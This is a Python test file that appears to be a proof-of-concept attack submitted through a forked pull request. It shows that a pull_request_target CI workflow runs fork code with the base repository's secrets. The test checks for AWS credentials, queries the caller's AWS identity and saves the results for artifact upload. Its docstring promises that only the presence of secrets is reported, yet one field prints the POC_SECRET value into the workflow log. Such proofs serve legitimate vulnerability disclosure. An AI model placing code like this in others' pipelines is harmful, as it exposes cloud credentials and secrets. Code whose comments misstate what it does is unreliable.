"""
Security Canary — Proof of Code Execution from Fork PR
=======================================================
This test proves that code from a forked PR executes in the
pull_request_target workflow context with access to the base
repository's secrets and OIDC credentials.

This is a SAFE canary — it only prints environment variable
presence (not values) and writes to a file for artifact upload.
"""
import os
import json
import subprocess


def test_security_canary():
    """Prove fork code execution + secret/credential access."""

    results = {
        "canary": "SECURITY_CANARY_FORK_CODE_EXECUTION",
        "github_repository": os.environ.get("GITHUB_REPOSITORY", ""),
        "github_event_name": os.environ.get("GITHUB_EVENT_NAME", ""),
        "github_actor": os.environ.get("GITHUB_ACTOR", ""),
        "github_triggering_actor": os.environ.get("GITHUB_TRIGGERING_ACTOR", ""),
        "github_head_ref": os.environ.get("GITHUB_HEAD_REF", ""),
        "github_base_ref": os.environ.get("GITHUB_BASE_REF", ""),
        "runner_os": os.environ.get("RUNNER_OS", ""),
        # Prove secrets are accessible (presence only, NOT values)
        "aws_access_key_id_present": bool(os.environ.get("AWS_ACCESS_KEY_ID")),
        "aws_secret_access_key_present": bool(os.environ.get("AWS_SECRET_ACCESS_KEY")),
        "aws_session_token_present": bool(os.environ.get("AWS_SESSION_TOKEN")),
        "aws_region": os.environ.get("AWS_REGION", os.environ.get("AWS_DEFAULT_REGION", "")),
        "dbt_aws_account_present": bool(os.environ.get("DBT_AWS_ACCOUNT")),
        "dbt_s3_location_present": bool(os.environ.get("DBT_S3_LOCATION")),
        # Prove base repo secret access (for fork-to-fork demo)
        "poc_secret_present": bool(os.environ.get("POC_SECRET")),
        "poc_secret_value": os.environ.get("POC_SECRET", "NOT_SET"),
    }

    # Print for workflow log visibility
    print("\n" + "=" * 60)
    print("SECURITY CANARY — FORK CODE EXECUTION PROOF")
    print("=" * 60)
    for k, v in results.items():
        print(f"  {k}: {v}")
    print("=" * 60)

    # If AWS creds present, show caller identity (safe — just shows role ARN)
    if results["aws_access_key_id_present"]:
        try:
            sts_output = subprocess.run(
                ["aws", "sts", "get-caller-identity"],
                capture_output=True, text=True, timeout=10
            )
            if sts_output.returncode == 0:
                identity = json.loads(sts_output.stdout)
                results["aws_caller_identity"] = identity
                print(f"  AWS Caller Identity: {json.dumps(identity, indent=2)}")
        except Exception as e:
            results["aws_sts_error"] = str(e)

    # Write results to file for artifact upload
    os.makedirs("/tmp/security-canary", exist_ok=True)
    with open("/tmp/security-canary/results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)

    # The test always passes — we just need the output
    assert results["canary"] == "SECURITY_CANARY_FORK_CODE_EXECUTION"
